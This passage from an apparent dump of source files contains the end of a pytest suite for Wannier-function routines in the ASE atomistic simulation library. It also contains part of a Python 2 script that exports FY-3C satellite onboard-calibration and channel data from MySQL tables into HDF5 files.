atoms.cell.array.diagonal()).all()\n    for i in range(nwannier):\n        assert np.linalg.norm(c1_w[i] - c0_w[i]) == \\\n            pytest.approx(np.linalg.norm(atoms.cell.array.diagonal()))\n\n\ndef test_distances(wan, h2_calculator):\n    nwannier = 2\n    calc = h2_calculator\n    atoms = calc.get_atoms()\n    wanf = wan(nwannier=nwannier, initialwannier='bloch')\n    cent_w = wanf.get_centers()\n    dist_ww = wanf.distances([0, 0, 0])\n    dist1_ww = wanf.distances([1, 1, 1])\n    for i in range(nwannier):\n        assert dist_ww[i, i] == pytest.approx(0)\n        assert dist1_ww[i, i] == pytest.approx(np.linalg.norm(atoms.cell.array))\n        for j in range(i + 1, nwannier):\n            assert dist_ww[i, j] == dist_ww[j, i]\n            assert dist_ww[i, j] == \\\n                pytest.approx(np.linalg.norm(cent_w[i] - cent_w[j]))\n\n\ndef test_get_hopping_bloch(wan):\n    nwannier = 4\n    wanf = wan(nwannier=nwannier, initialwannier='bloch')\n    hop0_ww = wanf.get_hopping([0, 0, 0])\n    hop1_ww = wanf.get_hopping([1, 1, 1])\n    for i in range(nwannier):\n        assert hop0_ww[i, i] != 0\n        assert hop1_ww[i, i] != 0\n        for j in range(i + 1, nwannier):\n            assert hop0_ww[i, j] == 0\n            assert hop1_ww[i, j] == 0\n            assert hop0_ww[i, j] == hop0_ww[j, i]\n            assert hop1_ww[i, j] == hop1_ww[j, i]\n\n\ndef test_get_hopping_random(wan, rng):\n    nwannier = 4\n    wanf = wan(nwannier=nwannier, initialwannier='random')\n    hop0_ww = wanf.get_hopping([0, 0, 0])\n    hop1_ww = wanf.get_hopping([1, 1, 1])\n    for i in range(nwannier):\n        for j in range(i + 1, nwannier):\n            assert np.abs(hop0_ww[i, j]) == pytest.approx(np.abs(hop0_ww[j, i]))\n            assert np.abs(hop1_ww[i, j]) == pytest.approx(np.abs(hop1_ww[j, i]))\n\n\ndef test_get_hamiltonian_bloch(wan):\n    nwannier = 4\n    atoms = molecule('H2', pbc=True)\n    atoms.center(vacuum=3.)\n    kpts = (2, 2, 2)\n    number_kpts = kpts[0] * kpts[1] * kpts[2]\n    wanf = wan(atoms=atoms, kpts=kpts,\n               nwannier=nwannier, initialwannier='bloch')\n    for k in range(number_kpts):\n        H_ww = wanf.get_hamiltonian(k=k)\n        for i in range(nwannier):\n            assert H_ww[i, i] != 0\n            for j in range(i + 1, nwannier):\n                assert H_ww[i, j] == 0\n                assert H_ww[i, j] == pytest.approx(H_ww[j, i])\n\n\ndef test_get_hamiltonian_random(wan, rng):\n    nwannier = 4\n    atoms = molecule('H2', pbc=True)\n    atoms.center(vacuum=3.)\n    kpts = (2, 2, 2)\n    number_kpts = kpts[0] * kpts[1] * kpts[2]\n    wanf = wan(atoms=atoms, kpts=kpts, rng=rng,\n               nwannier=nwannier, initialwannier='random')\n    for k in range(number_kpts):\n        H_ww = wanf.get_hamiltonian(k=k)\n        for i in range(nwannier):\n            for j in range(i + 1, nwannier):\n                assert np.abs(H_ww[i, j]) == pytest.approx(np.abs(H_ww[j, i]))\n\n\ndef test_get_hamiltonian_kpoint(wan, rng, h2_calculator):\n    nwannier = 4\n    calc = h2_calculator\n    atoms = calc.get_atoms()\n    wanf = wan(nwannier=nwannier, initialwannier='random')\n    kpts = atoms.cell.bandpath(density=50).cartesian_kpts()\n    for kpt_c in kpts:\n        H_ww = wanf.get_hamiltonian_kpoint(kpt_c=kpt_c)\n        for i in range(nwannier):\n            for j in range(i + 1, nwannier):\n                assert np.abs(H_ww[i, j]) == pytest.approx(np.abs(H_ww[j, i]))\n\n\ndef test_get_function(wan):\n    nwannier = 2\n    gpts_np = np.array(gpts)\n    wanf = wan(nwannier=nwannier, initialwannier='bloch')\n    assert (wanf.get_function(index=[0, 0]) == 0).all()\n    assert wanf.get_function(index=[0, 1]) + wanf.get_function(index=[1, 0]) \\\n        == pytest.approx(wanf.get_function(index=[1, 1]))\n    for i in range(nwannier):\n        assert (gpts_np * Nk == wanf.get_function(index=i).shape).all()\n        assert (gpts_np * [1, 2, 3] ==\n                wanf.get_function(index=i, repeat=[1, 2, 3]).shape).all()\n\n\n# Make sure this can run in CI: https://gitlab.com/ase/ase/-/issues/1100\n# @pytest.mark.calculator_lite\n@pytest.mark.parametrize('fun', ['std', 'var'])\ndef test_get_gradients(fun, wan, rng):\n    wanf = wan(nwannier=4, fixedstates=2, kpts=(1, 1, 1),\n               initialwannier='bloch', functional=fun)\n    # create an anti-hermitian array/matrix\n    step = rng.random(wanf.get_gradients().size) + \\\n        1.j * rng.random(wanf.get_gradients().size)\n    step *= 1e-8\n    step -= dagger(step)\n    f1 = wanf.get_functional_value()\n    wanf.step(step)\n    f2 = wanf.get_functional_value()\n    assert (np.abs((f2 - f1) / step).ravel() -\n            np.abs(wanf.get_gradients())).max() < 1e-4\n\n\n@pytest.mark.parametrize('init', ['bloch', 'random', 'orbitals', 'scdm'])\ndef test_initialwannier(init, wan, ti_calculator):\n    # dummy check to run the module with different initialwannier methods\n    wanf = wan(calc=ti_calculator, full_calc=True,\n               initialwannier=init, nwannier=14, fixedstates=12)\n    assert wanf.get_functional_value() > 0\n\n\ndef test_nwannier_auto(wan, ti_calculator):\n    \"\"\" Test 'auto' value for parameter 'nwannier'. \"\"\"\n    partial_wan = partial(\n        wan,\n        calc=ti_calculator,\n        full_calc=True,\n        initialwannier='bloch',\n        nwannier='auto'\n    )\n\n    # Check default value\n    wanf = partial_wan()\n    assert wanf.nwannier == 15\n\n    # Check value setting fixedenergy\n    wanf = partial_wan(fixedenergy=0)\n    assert wanf.nwannier == 15\n    wanf = partial_wan(fixedenergy=5)\n    assert wanf.nwannier == 18\n\n    # Check value setting fixedstates\n    number_kpts = Nk**3\n    list_fixedstates = [14] * number_kpts\n    list_fixedstates[Nk] = 18\n    wanf = partial_wan(fixedstates=list_fixedstates)\n    assert wanf.nwannier == 18\n\n\ndef test_arbitrary_s_orbitals(rng):\n    atoms = Atoms('3H', positions=[[0, 0, 0],\n                                   [1, 1.5, 1],\n                                   [2, 3, 0]])\n    orbs = arbitrary_s_orbitals(atoms, 10, rng)\n\n    atoms.append('H')\n    s_pos = atoms.get_scaled_positions()\n    for orb in orbs:\n        # Test if they are actually s-orbitals\n        assert orb[1] == 0\n\n        # Read random position\n        x, y, z = orb[0]\n        s_pos[-1] = [x, y, z]\n        atoms.set_scaled_positions(s_pos)\n\n        # Use dummy H atom to measure distance from any other atom\n        dists = atoms.get_distances(\n            a=-1,\n            indices=range(atoms.get_global_number_of_atoms() - 1))\n\n        # Test that the s-orbital is close to at least one atom\n        assert (dists < 1.5).any()\n\n\ndef test_init_orbitals_h2(rng):\n    # Check that the initial orbitals for H2 are as many as requested and they\n    # are all s-orbitals (l=0).\n    atoms = molecule('H2')\n    atoms.center(vacuum=3.)\n    ntot = 2\n    orbs = init_orbitals(atoms=atoms, ntot=ntot, rng=rng)\n    angular_momenta = [orb[1] for orb in orbs]\n    assert sum([l_ * 2 + 1 for l_ in angular_momenta]) == ntot\n    assert angular_momenta == [0] * ntot\n\n\ndef test_init_orbitals_ti(rng):\n    # Check that the initial orbitals for Ti bulk are as many as requested and\n    # there are both s-orbitals (l=0) and d-orbitals (l=2).\n    atoms = bulk('Ti')\n    ntot = 14\n    orbs = init_orbitals(atoms=atoms, ntot=ntot, rng=rng)\n    angular_momenta = [orb[1] for orb in orbs]\n    assert sum([l_ * 2 + 1 for l_ in angular_momenta]) == ntot\n    assert 0 in angular_momenta\n    assert 2 in angular_momenta\n\n\ndef test_search_for_gamma_point():\n    list_with_gamma = [[-1.0, -1.0, -1.0],\n                       [0.0, 0.0, 0.0],\n                       [0.1, 0.0, 0.0],\n                       [1.5, 2.5, 0.5]]\n    gamma_idx = search_for_gamma_point(list_with_gamma)\n    assert gamma_idx == 1\n\n    list_without_gamma = [[-1.0, -1.0, -1.0],\n                          [0.1, 0.0, 0.0],\n                          [1.5, 2.5, 0.5]]\n    gamma_idx = search_for_gamma_point(list_without_gamma)\n    assert gamma_idx is None\n\n\ndef test_scdm(ti_calculator):\n    calc = ti_calculator\n    Nw = 14\n    ps = calc.get_pseudo_wave_function(band=Nw, kpt=0, spin=0)\n    Ng = ps.size\n    kpt_kc = calc.get_bz_k_points()\n    number_kpts = len(kpt_kc)\n    nbands = calc.get_number_of_bands()\n    pseudo_nkG = np.zeros((nbands, number_kpts, Ng), dtype=np.complex128)\n    for k in range(number_kpts):\n        for n in range(nbands):\n            pseudo_nkG[n, k] = calc.get_pseudo_wave_function(\n                band=n, kpt=k, spin=0).ravel()\n    fixed_k = [Nw - 2] * number_kpts\n    C_kul, U_kww = scdm(pseudo_nkG, kpts=kpt_kc,\n                        fixed_k=fixed_k, Nw=Nw)\n    for k in range(number_kpts):\n        assert unitarity_error(U_kww[k]) < 1e-10, 'U_ww not unitary'\n        assert orthogonality_error(C_kul[k].T) < 1e-10, \\\n            'C_ul columns not orthogonal'\n        assert normalization_error(C_kul[k]) < 1e-10, 'C_ul not normalized'\n\n\n@pytest.mark.xfail\ndef test_get_optimal_nwannier(wan, si_calculator):\n    \"\"\" Test method to compute the optimal 'nwannier' value. \"\"\"\n\n    wanf = wan(calc=si_calculator, full_calc=True,\n               initialwannier='bloch', nwannier='auto', fixedenergy=1)\n\n    # Test with default parameters\n    opt_nw = wanf.get_optimal_nwannier()\n    assert opt_nw == 7\n\n    # Test with non-default parameters.\n    # This is mostly to test that is does actually support this parameters,\n    # it's not really testing the actual result.\n    opt_nw = wanf.get_optimal_nwannier(nwrange=10)\n    assert opt_nw == 7\n    opt_nw = wanf.get_optimal_nwannier(tolerance=1e-2)\n    assert opt_nw == 8\n\n    # This should give same result since the initialwannier does not include\n    # randomness.\n    opt_nw = wanf.get_optimal_nwannier(random_reps=10)\n    assert opt_nw == 7\n\n    # Test with random repetitions, just test if it runs.\n    wanf = wan(calc=si_calculator, full_calc=True,\n               initialwannier='orbitals', nwannier='auto', fixedenergy=0)\n    opt_nw = wanf.get_optimal_nwannier(random_reps=10)\n    assert opt_nw >= 0\n\n\n@pytest.mark.xfail\ndef test_spread_contributions(wan):\n    # Only a test on a constant value to make sure it does not deviate too much\n    wan1 = wan()\n    test_values_w = wan1._spread_contributions()\n    ref_values_w = [2.28535569, 0.04660427]\n    assert test_values_w == pytest.approx(ref_values_w, abs=1e-4)\n", "67": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Temporary program, draw OBC 2-dim and 3-dim data every 12 or 6 hours.\n\nUsage:\n    calc_draw_4sbus_mwhs.py --sat=fy3c --ins=mwhs --span=12 --date=20140626\n\nArguments:\n    sat: the satellite you want to calc, fy3c\n    ins: the insatrument you want to calc, mwts\n    span: hour span, 12 or 6. ONLY 12 is supported now.\n    date: draw for special date. YYYY-mm-dd-h like 2014-04-24-12 [default: now]\n        where 2014-04-24-12 means draw for launch time to today's 11:59\n\neg:\nif we are crontabed at 2013-12-06 14:00, we should draw for previous time zone \n(14:00-12) = 02:00, that is: launch time to today's 11:59's data.\n\"\"\"\n\n__author__ = 'hanxl'\n\n# Copyright (c) 2014, shinetek.\n# All rights reserved.\n#    \n# work flow:\n# crontabed every 12 or 6 hours, then\n#      check ps result, kill previous same program, avoiding hang.\n#      get time span\n#      get obc table list\n#      export all life obc data to hdf\n#      draw png\n#      mv png to dest path\n#         \n# /usr/bin/python /home/fymonitor/MONITORFY3C/py2/bin/calc_draw_obc.py \n# --sat=fy3c --ins=mwts --nwp=t639 --date=now\n# >> /home/fymonitor/DATA/LOG/calc_draw_obc.py.log 2>&1 &\n#                         \n# date          author    changes\n# 2014-05-19    gumeng    update\n# 2014-04-28    gumeng    create\n\nimport os\nimport sys\nimport time\nimport numpy\nimport signal\nimport commands\nimport warnings\nimport MySQLdb\nimport h5py as h5\nimport shutil\n#import datetime\n#from datetime import *\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom multiprocessing import Pool\nfrom multiprocessing.dummy import Pool as ThreadPool \n\nwarnings.filterwarnings('ignore', category = MySQLdb.Warning)\n\ntimeuse_begin = time.time()\n\nsys.path.append('/home/fymonitor/MONITORFY3C/py2/conf')\nconf = __import__('conf')\ncommon = __import__('common')\ndocopt = __import__('docopt')\n\n# set read-only global variables.\n\narguments = docopt.docopt(__doc__)\nsat = arguments['--sat'].lower()\nins = arguments['--ins'].lower()\nhour_span = arguments['--span'].lower()\ninputdate = arguments['--date'].lower()\ncalc_date = inputdate\n\nins_conf_file = sat.upper() + '_' + ins.upper() + '_CONF'\nins_conf = __import__(ins_conf_file)\n\nif sat not in conf.support_sat_ins or ins not in conf.support_sat_ins[sat]:\n    print 'sat or ins setting is NOT found in conf.py'\n    sys.exit(0)\n    \npid = os.getpid()\nfname = os.path.splitext(os.path.basename(os.path.realpath(__file__) ) )[0]\nlog_tag = fname + '.' + sat + '.' + ins + '.' + str(pid)\nmy_name = common.get_local_hostname()\nmy_tag = my_name+'.'+log_tag\nmy_pidfile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.pid'\nmy_alivefile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.alive'\nmy_log = conf.log_path + '/' + my_name + '.' # just prefix: /log/path/prefix.\n\n#get the correct time span.\n#if calc_date == 'now':\n#    calc_date = common.utc_YmdH()\n#timespan = common.get_calc_timespan(calc_date, hour_span)\n#timespan['begin_t'] = 0 # the min time stamp before launch.\n#time_tag = timespan['begin_str'] + '`' + timespan['end_str'] + '`'\n\n# mysql tables we should draw\n#my_Calc_channel_table = []\n#my_channel_table = []\n#my_obc_table = []\n#my_Calc_table = []\n\n\nCalc_table_1month =[]\n\n\nobc_table_1month = []\n\n\nchannel_table_1month = []\n\n\nCalc_channel_table_1month = []\n\n\nT639=[]\n\n# Deal with signal.\ndef signal_handler(signum, frame):\n    msg = 'FAILED`recv signal ' + str(signum) + '. exit now.'\n    common.info(my_log, log_tag, inputdate + msg)\n\n    if os.path.isfile(my_pidfile):\n        os.remove(my_pidfile)\n    \n    sys.exit(0)\n\n# create hdf by obc setting\n\ndef draw_one_channel():\n    \n    if len(channel_table_1month) <= 0:\n        return True\n   \n    if len(Calc_channel_table_1month) <= 0:\n        return True\n    \n    print\"just channel\"\n      \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])  \n        \n        \n        \n        for index,item in enumerate(channel_table_1month):\n            \n            tmpfile1month = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS() \\\n            + '.ch' + '.1month' \n            sql_1month = 'select * from '+item[0]+ conf.export_txt%(tmpfile1month + '.txt')\n            cur.execute(sql_1month)\n            tmphdf = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS()+'.HDF'\n            print tmphdf\n            data = open(tmpfile1month+'.txt').read() \n            if len(data)==0:\n                print \"empty table\"+item[0]\n                continue\n            hfile = h5.File(tmphdf, 'w')\n            data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n            \n            hfile.create_dataset('id', data = (data_1month[:, 0]).astype(numpy.int))\n            hfile.create_dataset('channel', data = (data_1month[:, 1]).astype(numpy.int))\n            hfile.create_dataset('scln', data = (data_1month[:, 2]).astype(numpy.int))\n            hfile.create_dataset('ymdhms', data = (data_1month[:, 3]).astype(numpy.str))\n            hfile.create_dataset('cal_coef1', data = (data_1month[:, 4]).astype(numpy.int))\n            hfile.create_dataset('cal_coef2', data = (data_1month[:, 5]).astype(numpy.int))\n            hfile.create_dataset('cal_coef3', data = (data_1month[:, 6]).astype(numpy.int))\n            \n            hfile.close()\n            \n        for index,item in enumerate(Calc_channel_table_1month):\n            tmpfile1month_calc = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS() \\\n            + '.ch' + '.1month_calc'\n            sql_1month_calc = 'select * from '+item[0]+ conf.export_txt%(tmpfile1month_calc + '.txt')\n            cur.execute(sql_1month_calc)\n            tmphdf = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS()+'.HDF'\n            print tmphdf\n            data = open(tmpfile1month_calc+'.txt').read() \n            if len(data)==0:\n                print \"empty table\"+item[0]\n                continue\n            hfile = h5.File(tmphdf, 'w')\n            data_1month_calc = numpy.loadtxt(tmpfile1month_calc + '.txt', dtype='str', delimiter=',')\n            \n            hfile.create_dataset('id', data = data_1month_calc[:, 0].astype(numpy.int))\n            hfile.create_dataset('channel', data = data_1month_calc[:, 1].astype(numpy.int))\n            hfile.create_dataset('scln', data = data_1month_calc[:, 2].astype(numpy.int))\n            hfile.create_dataset('ymdhms', data = data_1month_calc[:, 3].astype(numpy.str))\n            hfile.create_dataset('gain', data = data_1month_calc[:, 4].astype(numpy.int))\n            hfile.create_dataset('agc', data = data_1month_calc[:, 5].astype(numpy.int))\n            hfile.create_dataset('SPBB1', data = data_1month_calc[:, 6].astype(numpy.int))\n            hfile.create_dataset('SPBB2', data = data_1month_calc[:, 7].astype(numpy.int))\n            \n            hfile.close()\n        \n        \n        \n        \n        \n            \n        \n        #cur.execute(sql_1month)\n        #print Calc_channel_table_3day\n        #print \"-------------------------------------\"\n        #print sql_1month_calc\n        \n        #cur.execute(sql_1month_calc)\n        \n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'draw obc 3-dim ch'  + ' png`Mysql Fatal Error[' \\\n            + str(e.args[0]) + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, inputdate + msg)\n        return False\n\n    \n    \n    #hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n    #hfile.create_dataset(\"time_1month_channel_calc\", data = ymdh_arr.astype(numpy.int32)) \n    #ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n    \n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n    #hfile.create_dataset(\"time_3day_channel_calc\", data = ymdh_arr.astype(numpy.int32))     \n    #ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n\n\n    \n    #return \n    \n\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_CH01_[PRT|INS_TEMP|...]\n    \n    \n    return True\n\n\n\n\n\n#2014-08-08 00:00:00\n  \n   \n\n     \n\ndef draw_just_obc():\n    \n    if len(obc_table_1month) <= 0:\n        return True\n    \n    if len(Calc_table_1month) <= 0:\n        return True\n    \n    print\"just obc\"\n    #begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + obc_table_3day[0] \\\n                #+ \" limit 1\"   \n    \n    \n    #sql_1month = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n    #                             obc_table_1month, conf.obc_select_prefix_sql) \\\n    #  + conf.export_txt%(tmpfile1month + '.txt')\n        \n\n\n    \n      \n    \n    \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])    \n        \n        for index,item in enumerate(obc_table_1month):\n            tmpfile1month = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS() +'.1month' +'.obc'\n            sql_1month = 'select * from '+item[0]+ conf.export_txt%(tmpfile1month + '.txt')\n            cur.execute(sql_1month)\n            tmphdf = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS()+'.OBC.HDF'\n            print tmphdf\n            data = open(tmpfile1month+'.txt').read() \n            if len(data)==0:\n                print \"empty table\"+item[0]\n                continue\n            hfile = h5.File(tmphdf, 'w')\n            \n            data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n            \n            hfile.create_dataset('id', data = data_1month[:, 0].astype(numpy.int))\n            hfile.create_dataset('scln', data = data_1month[:, 1].astype(numpy.int))\n            hfile.create_dataset('ymdhms', data = data_1month[:, 2].astype(numpy.str))\n            hfile.create_dataset('ins_temp1', data = data_1month[:, 3].astype(numpy.int))\n            hfile.create_dataset('ins_temp2', data = data_1month[:, 4].astype(numpy.int))\n            hfile.create_dataset('prt_avg1', data = data_1month[:, 5].astype(numpy.int))\n            hfile.create_dataset('prt_avg2', data = data_1month[:, 6].astype(numpy.int))\n            hfile.create_dataset('cold_ang', data = data_1month[:, 7].astype(numpy.int))\n            hfile.create_dataset('hot_ang', data = data_1month[:, 8].astype(numpy.int))\n            hfile.create_dataset('pixviewangle1', data = data_1month[:, 9].astype(numpy.int))\n            hfile.create_dataset('pixviewangle2', data = data_1month[:, 10].astype(numpy.int))\n            \n            hfile.close()\n            \n        for index,item in enumerate(Calc_table_1month):\n            tmpfile1month_calc = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS() +'.1month.calc' +'.obc'\n            sql_1month_calc = 'select * from '+item[0]+ conf.export_txt%(tmpfile1month_calc + '.txt')\n            cur.execute(sql_1month_calc)\n            tmphdf = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS()+'.OBC.HDF'\n            print tmphdf\n            data = open(tmpfile1month_calc+'.txt').read() \n            if len(data)==0:\n                print \"empty table\"+item[0]\n                continue\n            hfile = h5.File(tmphdf, 'w')\n            data_1month_calc = numpy.loadtxt(tmpfile1month_calc + '.txt', dtype='str', delimiter=',')\n            \n            hfile.create_dataset('id', data = data_1month_calc[:, 0].astype(numpy.int))\n            hfile.create_dataset('scln', data = data_1month_calc[:, 1].astype(numpy.int))\n            hfile.create_dataset('ymdhms', data = data_1month_calc[:, 2].astype(numpy.str))\n            hfile.create_dataset('digital_control_u', data = data_1month_calc[:, 3].astype(numpy.int))\n            hfile.create_dataset('cell_control_u', data = data_1month_calc[:, 4].astype(numpy.int))\n            hfile.create_dataset('motor_temp_1', data = data_1month_calc[:, 5].astype(numpy.int))\n            hfile.create_dataset('motor_temp_2', data = data_1month_calc[:, 6].astype(numpy.int))\n            hfile.create_dataset('antenna_mask_temp_1', data = data_1month_calc[:, 7].astype(numpy.int))\n            hfile.create_dataset('antenna_mask_temp_2', data = data_1month_calc[:, 8].astype(numpy.int))\n            hfile.create_dataset('fet_118_amp_temp', data = data_1month_calc[:, 9].astype(numpy.int))\n            hfile.create_dataset('fet_183_amp_temp', data = data_1month_calc[:, 10].astype(numpy.int))\n            hfile.create_dataset('scan_prd', data = data_1month_calc[:, 11].astype(numpy.int))\n            \n            hfile.close()\n        \n        \n        #cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        #print sql_3day\n        #print \"------------------\"\n        #print sql_1month\n        #print \"------------------\"\n        #print sql_3day_calc\n        #print \"------------------\"\n        #print sql_1month_calc\n        #print \"------------------\"\n        #print begin_sql_3day\n        #print \"------------------\"\n        msg = '??draw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, inputdate + msg)\n        return False\n    \n \n   \n\n    \n    \n\n#     \n#     get_obc_txt(tmpfile1year,tmpfilelife,'cold_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'hot_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'earth_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'scan_prd')\n    \n\n    \n    \n    # trans txt result to numpy fmt, to easy hdf create.\n    \n    \n    \n    \n    \n\n     # w: rewrite if hdf already exist.\n    \n    \n    #ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_to_db.values())\n    \n\n    \n    #hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32)) \n\n    \n\n    #if not ret:\n        #return False\n\n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n#     hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n#     #hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1]*0.001.astype(numpy.int32))\n#     hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_1month_calc',data=data_1month_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_1month_calc',data=data_1month_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_1month_calc',data=data_1month_calc[: ,4].astype(numpy.float32))\n#     #ret = create_obc_hdf('1month_calc',hfile,data_1month, ins_conf.calc_to_db.values())\n# \n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n#     hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32)) \n#     hfile.create_dataset('cold_ang_minus_3day_calc',data=data_3day_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_3day_calc',data=data_3day_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_3day_calc',data=data_3day_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_3day_calc',data=data_3day_calc[: ,4].astype(numpy.float32))\n#         \n#     #ret = create_obc_hdf('3day_calc',hfile,data_3day, ins_conf.calc_to_db.values())\n\n    \n   \n    \n    \n    #sds_len = len(ins_conf.sds_name)\n    #for i in xrange(1, sds_len+1):\n    #    create_1year_hdf(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'],hfile)\n        \n#     \n#     create_1year_hdf(tmpfile1year,tmpfilelife,'cold_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'hot_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'earth_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'scan_prd',hfile)\n\n    \n    #return True\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_[PRT|INS_TEMP|...]\n    \n\n    return True\n    \ndef draw_t639():\n    \n    if len(T639) <= 0:\n        return True\n    \n    \n    \n    print\"just t639\"\n    #begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + obc_table_3day[0] \\\n                #+ \" limit 1\"   \n    \n    \n    #sql_1month = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n    #                             obc_table_1month, conf.obc_select_prefix_sql) \\\n    #  + conf.export_txt%(tmpfile1month + '.txt')\n        \n\n\n    \n      \n    \n    \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])    \n        \n        for index,item in enumerate(T639):\n            tmpfile1month = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS() +'.1month' +'.obc'\n            sql_1month = 'select * from '+item[0]+ conf.export_txt%(tmpfile1month + '.txt')\n            cur.execute(sql_1month)\n            tmphdf = '/assimilation/fymonitor/DATA/TMP/test/' + item[0] + '.' + common.utc_YmdHMS()+'.HDF'\n            print tmphdf\n            data = open(tmpfile1month+'.txt').read() \n            if len(data)==0:\n                print \"empty table\"+item[0]\n                continue\n            hfile = h5.File(tmphdf, 'w')\n            print tmpfile1month + '.txt'\n            data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n            \n            hfile.create_dataset('id', data = data_1month[:, 0].astype(numpy.int))\n            hfile.create_dataset('scln', data = data_1month[:, 1].astype(numpy.int))\n            hfile.create_dataset('scpt', data = data_1month[:, 2].astype(numpy.int))\n            hfile.create_dataset('ymdhms', data = data_1month[:, 3].astype(numpy.str))\n            hfile.create_dataset('obt_direct', data = data_1month[:, 4].astype(numpy.str))\n            hfile.create_dataset('lat', data = data_1month[:, 5].astype(numpy.int))\n            hfile.create_dataset('lon', data = data_1month[:, 6].astype(numpy.int))\n            hfile.create_dataset('sen_zen', data = data_1month[:, 7].astype(numpy.int))\n            hfile.create_dataset('sen_az', data = data_1month[:, 8].astype(numpy.int))\n            hfile.create_dataset('landsea', data = data_1month[:, 9].astype(numpy.int))\n            hfile.create_dataset('dem', data = data_1month[:, 10].astype(numpy.int))\n            hfile.create_dataset('obs_bt1', data = data_1month[:, 11].astype(numpy.int))\n            hfile.create_dataset('obs_bt2', data = data_1month[:, 12].astype(numpy.int))\n            hfile.create_dataset('obs_bt3', data = data_1month[:, 13].astype(numpy.int))\n            hfile.create_dataset('obs_bt4', data = data_1month[:, 14].astype(numpy.int))\n            hfile.create_dataset('obs_bt5', data = data_1month[:, 15].astype(numpy.int))\n            hfile.create_dataset('obs_bt6', data = data_1month[:, 16].astype(numpy.int))\n            hfile.create_dataset('obs_bt7', data = data_1month[:, 17].astype(numpy.int))\n            